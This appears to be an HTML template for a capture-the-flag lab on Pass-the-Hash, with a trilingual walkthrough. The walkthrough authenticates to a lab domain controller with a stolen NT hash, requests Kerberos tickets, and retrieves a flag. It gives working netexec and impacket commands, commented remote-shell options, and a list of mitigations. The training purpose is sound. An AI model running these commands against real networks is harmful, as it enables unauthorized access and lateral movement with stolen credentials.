@@ -1,0 +1,208 @@
+{% extends "base.html" %}
+{% block title %}AD11 – Pass-the-Hash – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2" style="color:var(--hl-primary)" data-i18n="obj_title">Objetivo</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="ad_pth_obj_desc">Con el hash NT de a.miller obtenido en el volcado del NTDS, autentícate en el dominio sin conocer su contraseña en claro y lee //DC01/finance.</p>
+    <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="obj_flag_lbl">Flag:</strong> <code>//{{ ad_dc_host }}/finance/flag-ad-11.txt</code> <span data-i18n="ad_obj_flag_where">— captúrala en el Domain Controller y valídala en la caja «Validar Flag» al final de esta página.</span></p>
+  </div>
+
+  {% include 'labs/_ad_target.html' %}
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-3" data-i18n="ad_quickstart">Inicio rápido</h2>
+    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Prerequisito: hash NT de a.miller obtenido en el lab AD10 (DCSync)
+nxc smb {{ ad_dc_ip }} -u 'a.miller' -H '&lt;hash_NT_a.miller&gt;' --shares</pre>
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>1 · Por qué funciona</h3>
+    <p>En NTLM, el cliente nunca envía la contraseña: prueba que conoce su <em>hash NT</em> mediante un reto/respuesta. Por tanto el hash NT <strong>es</strong> la credencial: si lo tienes, puedes autenticarte sin conocer la contraseña en claro. Esto es <em>Pass-the-Hash</em>.</p>
+
+    <h3>2 · Obtener el hash</h3>
+    <p>El hash de <code>a.miller</code> salió en el volcado NTDS del lab AD10:</p>
+    <pre>a.miller:1108:aad3b435b51404eeaad3b435b51404ee:&lt;hash_NT_a.miller&gt;:::
+
+# Nos quedamos solo con la parte NT (la que va detrás del segundo ':')
+export ADMILLER_NT='&lt;hash_NT_a.miller&gt;'</pre>
+
+    <h3>3 · Autenticarse con el hash</h3>
+    <pre># netexec — comprobar acceso y recursos
+nxc smb {{ ad_dc_ip }} -u 'a.miller' -H "$ADMILLER_NT" --shares
+
+# impacket-smbclient
+impacket-smbclient -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@{{ ad_dc_ip }}
+
+# Un shell remoto si la cuenta fuese admin local en algún equipo
+# impacket-psexec  -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@&lt;host&gt;
+# evil-winrm -i &lt;host&gt; -u a.miller -H "$ADMILLER_NT"</pre>
+
+    <h3>4 · Over-Pass-the-Hash (hash → ticket Kerberos)</h3>
+    <p>El hash NT también sirve como clave RC4 para pedir un TGT y moverte por Kerberos (más sigiloso que NTLM):</p>
+    <pre>impacket-getTGT '{{ ad_realm_lower }}/a.miller' -hashes ":$ADMILLER_NT" -dc-ip {{ ad_dc_ip }}
+export KRB5CCNAME=a.miller.ccache
+impacket-smbclient -k -no-pass {{ ad_dc_fqdn }}</pre>
+    <p><strong>Nota sobre este laboratorio:</strong> el comando de arriba revienta con <code>Attempted "__str__" operation on ASN.1 schema object</code> — es un bug real de impacket (confirmado en la versión de Kali y en la última de PyPI), no algo específico de Samba: <code>CCache.fromTGT()</code> no comprueba si el campo opcional <code>starttime</code> del AS-REP tiene valor antes de convertirlo a texto, y Samba lo omite (RFC 4120 §5.4.2 permite omitirlo; Windows AD casi siempre lo incluye, por eso el bug pasa desapercibido en producción). Descarga el wrapper que lo corrige (monkeypatch de una función, sin tocar impacket):</p>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get getTGT_fixed.py'
+
+python3 getTGT_fixed.py '{{ ad_realm_lower }}/a.miller' -hashes ":$ADMILLER_NT" -dc-ip {{ ad_dc_ip }}
+export KRB5CCNAME=a.miller.ccache
+klist</pre>
+    <p>El TGT ya es real y válido en este punto. El siguiente salto (pedir un TGS para <code>cifs/{{ ad_dc_host|lower }}</code> y usarlo contra SMB) topaba con un segundo bug de impacket, también real: <code>getKerberosTGS()</code> nunca manda el checksum <em>keyed</em> que RFC 4120 §5.5.1 exige en el Authenticator del TGS-REQ (key usage 6), y el KDC de Samba sí lo exige — sin él responde <code>KRB_AP_ERR_INAPP_CKSUM</code> (el mismo bug que bloqueaba Kerberoasting, ver AD05). Con ese checksum añadido, el acceso SMB vía Kerberos funciona <strong>completamente en vivo</strong>:</p>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get smbclient_fixed.py'
+
+python3 smbclient_fixed.py -k -no-pass {{ ad_dc_fqdn }} -dc-ip {{ ad_dc_ip }}
+# smb: \&gt; use finance
+# smb: \&gt; get flag-ad-11.txt</pre>
+    <p>Over-Pass-the-Hash completo y real: del hash NT de a.miller a una sesión SMB autenticada por Kerberos, sin conocer nunca su contraseña en claro.</p>
+
+    <h3>5 · Capturar la flag</h3>
+    <pre>impacket-smbclient -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@{{ ad_dc_ip }}
+# use finance
+# get flag-ad-11.txt
+
+# o en una línea con netexec
+nxc smb {{ ad_dc_ip }} -u 'a.miller' -H "$ADMILLER_NT" \
+  --share finance --get-file flag-ad-11.txt ./flag-ad-11.txt && cat flag-ad-11.txt</pre>
+    <pre>HL{···}</pre>
+
+    <h3>Mitigación</h3>
+    <ul>
+      <li>Grupo <em>Protected Users</em> y desactivar NTLM donde sea posible (forzar Kerberos + AES).</li>
+      <li>LAPS + evitar reutilización de contraseñas de admin local para frenar el movimiento lateral.</li>
+      <li>Credential Guard y limitar los inicios de sesión interactivos de cuentas privilegiadas.</li>
+    </ul>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">impacket-smbclient</span> <span class="tools-badge">impacket-psexec</span> <span class="tools-badge">impacket-getTGT</span> <span class="tools-badge">evil-winrm</span> <span class="tools-badge">mimikatz (sekurlsa::pth)</span></div>
+  </div>
+
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>1 · Why it works</h3>
+    <p>In NTLM the client never sends the password: it proves knowledge of its <em>NT hash</em> through a challenge/response. So the NT hash <strong>is</strong> the credential: if you have it, you can authenticate without knowing the cleartext. That is <em>Pass-the-Hash</em>.</p>
+
+    <h3>2 · Get the hash</h3>
+    <p>The <code>a.miller</code> hash came out of the NTDS dump in lab AD10:</p>
+    <pre>a.miller:1108:aad3b435b51404eeaad3b435b51404ee:&lt;a.miller_NT_hash&gt;:::
+
+# Keep just the NT part (after the second ':')
+export ADMILLER_NT='&lt;a.miller_NT_hash&gt;'</pre>
+
+    <h3>3 · Authenticate with the hash</h3>
+    <pre># netexec — check access and shares
+nxc smb {{ ad_dc_ip }} -u 'a.miller' -H "$ADMILLER_NT" --shares
+
+# impacket-smbclient
+impacket-smbclient -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@{{ ad_dc_ip }}
+
+# A remote shell if the account were a local admin somewhere
+# impacket-psexec  -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@&lt;host&gt;
+# evil-winrm -i &lt;host&gt; -u a.miller -H "$ADMILLER_NT"</pre>
+
+    <h3>4 · Over-Pass-the-Hash (hash → Kerberos ticket)</h3>
+    <p>The NT hash also works as an RC4 key to request a TGT and move over Kerberos (stealthier than NTLM):</p>
+    <pre>impacket-getTGT '{{ ad_realm_lower }}/a.miller' -hashes ":$ADMILLER_NT" -dc-ip {{ ad_dc_ip }}
+export KRB5CCNAME=a.miller.ccache
+impacket-smbclient -k -no-pass {{ ad_dc_fqdn }}</pre>
+    <p><strong>Note about this lab:</strong> the command above blows up with <code>Attempted "__str__" operation on ASN.1 schema object</code> — this is a real impacket bug (confirmed in both Kali's packaged version and the latest PyPI release), not something Samba-specific: <code>CCache.fromTGT()</code> never checks whether the AS-REP's optional <code>starttime</code> field actually has a value before stringifying it, and Samba omits it (RFC 4120 §5.4.2 allows omitting it; Windows AD almost always includes it, which is why the bug goes unnoticed in production). Download the wrapper that fixes it (a one-function monkeypatch, impacket itself is untouched):</p>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get getTGT_fixed.py'
+
+python3 getTGT_fixed.py '{{ ad_realm_lower }}/a.miller' -hashes ":$ADMILLER_NT" -dc-ip {{ ad_dc_ip }}
+export KRB5CCNAME=a.miller.ccache
+klist</pre>
+    <p>The TGT is real and valid at this point. The next hop (requesting a TGS for <code>cifs/{{ ad_dc_host|lower }}</code> and using it against SMB) hit a second, equally real impacket bug: <code>getKerberosTGS()</code> never sends the <em>keyed</em> checksum RFC 4120 §5.5.1 requires in the TGS-REQ Authenticator (key usage 6), and Samba's KDC genuinely requires it — without it, it replies <code>KRB_AP_ERR_INAPP_CKSUM</code> (the same bug that blocked Kerberoasting, see AD05). With that checksum added, Kerberos-based SMB access works <strong>fully live</strong>:</p>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get smbclient_fixed.py'
+
+python3 smbclient_fixed.py -k -no-pass {{ ad_dc_fqdn }} -dc-ip {{ ad_dc_ip }}
+# smb: \&gt; use finance
+# smb: \&gt; get flag-ad-11.txt</pre>
+    <p>Full, real Over-Pass-the-Hash: from a.miller's NT hash to a Kerberos-authenticated SMB session, never knowing their cleartext password.</p>
+
+    <h3>5 · Capture the flag</h3>
+    <pre>impacket-smbclient -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@{{ ad_dc_ip }}
+# use finance
+# get flag-ad-11.txt
+
+# or as a one-liner with netexec
+nxc smb {{ ad_dc_ip }} -u 'a.miller' -H "$ADMILLER_NT" \
+  --share finance --get-file flag-ad-11.txt ./flag-ad-11.txt && cat flag-ad-11.txt</pre>
+    <pre>HL{···}</pre>
+
+    <h3>Mitigation</h3>
+    <ul>
+      <li><em>Protected Users</em> group and disabling NTLM where possible (force Kerberos + AES).</li>
+      <li>LAPS + no local-admin password reuse to stop lateral movement.</li>
+      <li>Credential Guard and restricting interactive logons of privileged accounts.</li>
+    </ul>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">impacket-smbclient</span> <span class="tools-badge">impacket-psexec</span> <span class="tools-badge">impacket-getTGT</span> <span class="tools-badge">evil-winrm</span> <span class="tools-badge">mimikatz (sekurlsa::pth)</span></div>
+  </div>
+  <div class="lang-content" data-lang="pt" style="display:none">
+    <h3>1 · Por que funciona</h3>
+    <p>No NTLM, o cliente nunca envia a senha: ele comprova o conhecimento do seu <em>hash NT</em> por meio de um mecanismo de desafio/resposta (challenge/response). Portanto, o hash NT <strong>é</strong> a credencial: se você o possui, pode autenticar-se sem conhecer o texto claro. Isso é o <em>Pass-the-Hash</em>.</p>
+
+    <h3>2 · Obter o hash</h3>
+    <p>O hash de <code>a.miller</code> foi extraído do dump do NTDS no laboratório AD10:</p>
+    <pre>a.miller:1108:aad3b435b51404eeaad3b435b51404ee:&lt;a.miller_NT_hash&gt;:::
+
+# Keep just the NT part (after the second ':')
+export ADMILLER_NT='&lt;a.miller_NT_hash&gt;'</pre>
+
+    <h3>3 · Autenticar-se com o hash</h3>
+    <pre># netexec — check access and shares
+nxc smb {{ ad_dc_ip }} -u 'a.miller' -H "$ADMILLER_NT" --shares
+
+# impacket-smbclient
+impacket-smbclient -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@{{ ad_dc_ip }}
+
+# A remote shell if the account were a local admin somewhere
+# impacket-psexec  -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@&lt;host&gt;
+# evil-winrm -i &lt;host&gt; -u a.miller -H "$ADMILLER_NT"</pre>
+
+    <h3>4 · Over-Pass-the-Hash (hash → ticket Kerberos)</h3>
+    <p>O hash NT também serve como chave RC4 para solicitar um TGT e transitar via Kerberos (mais furtivo que NTLM):</p>
+    <pre>impacket-getTGT '{{ ad_realm_lower }}/a.miller' -hashes ":$ADMILLER_NT" -dc-ip {{ ad_dc_ip }}
+export KRB5CCNAME=a.miller.ccache
+impacket-smbclient -k -no-pass {{ ad_dc_fqdn }}</pre>
+    <p><strong>Nota sobre este laboratório:</strong> o comando acima falha com <code>Attempted "__str__" operation on ASN.1 schema object</code> — trata-se de um bug real do impacket (confirmado tanto na versão empacotada do Kali quanto no release mais recente do PyPI), não sendo algo específico do Samba: <code>CCache.fromTGT()</code> nunca verifica se o campo opcional <code>starttime</code> do AS-REP realmente tem um valor antes de convertê-lo para string, e o Samba o omite (a RFC 4120 §5.4.2 permite omiti-lo; o Windows AD quase sempre o inclui, razão pela qual o bug passa despercebido em produção). Baixe o wrapper que corrige isso (um monkeypatch de uma única função, sem alterar o impacket em si):</p>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get getTGT_fixed.py'
+
+python3 getTGT_fixed.py '{{ ad_realm_lower }}/a.miller' -hashes ":$ADMILLER_NT" -dc-ip {{ ad_dc_ip }}
+export KRB5CCNAME=a.miller.ccache
+klist</pre>
+    <p>O TGT é real e válido neste ponto. O próximo salto (solicitar um TGS para <code>cifs/{{ ad_dc_host|lower }}</code> e usá-lo contra o SMB) atinge um segundo bug real do impacket: o <code>getKerberosTGS()</code> nunca envia o checksum <em>com chave</em> exigido pela RFC 4120 §5.5.1 no Authenticator do TGS-REQ (key usage 6), e o KDC do Samba genuinamente o requer — sem ele, responde com <code>KRB_AP_ERR_INAPP_CKSUM</code> (o mesmo bug que bloqueou o Kerberoasting, veja AD05). Com esse checksum adicionado, o acesso SMB baseado em Kerberos funciona <strong>completamente em tempo real</strong>:</p>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get smbclient_fixed.py'
+
+python3 smbclient_fixed.py -k -no-pass {{ ad_dc_fqdn }} -dc-ip {{ ad_dc_ip }}
+# smb: \&gt; use finance
+# smb: \&gt; get flag-ad-11.txt</pre>
+    <p>Over-Pass-the-Hash completo e real: do hash NT de a.miller até uma sessão SMB autenticada via Kerberos, sem nunca conhecer a senha em texto claro.</p>
+
+    <h3>5 · Capturar a flag</h3>
+    <pre>impacket-smbclient -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@{{ ad_dc_ip }}
+# use finance
+# get flag-ad-11.txt
+
+# or as a one-liner with netexec
+nxc smb {{ ad_dc_ip }} -u 'a.miller' -H "$ADMILLER_NT" \
+  --share finance --get-file flag-ad-11.txt ./flag-ad-11.txt && cat flag-ad-11.txt</pre>
+    <pre>HL{···}</pre>
+
+    <h3>Mitigação</h3>
+    <ul>
+      <li>Grupo <em>Protected Users</em> e desativação do NTLM onde possível (forçar Kerberos + AES).</li>
+      <li>LAPS + não reutilização de senhas de administradores locais para conter a movimentação lateral.</li>
+      <li>Credential Guard e restrição de logons interativos de contas privilegiadas.</li>
+    </ul>
+
+    <h3>Ferramentas</h3>
+    <div><span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">impacket-smbclient</span> <span class="tools-badge">impacket-psexec</span> <span class="tools-badge">impacket-getTGT</span> <span class="tools-badge">evil-winrm</span> <span class="tools-badge">mimikatz (sekurlsa::pth)</span></div>
+  </div>
+</div>
+{% endblock %}
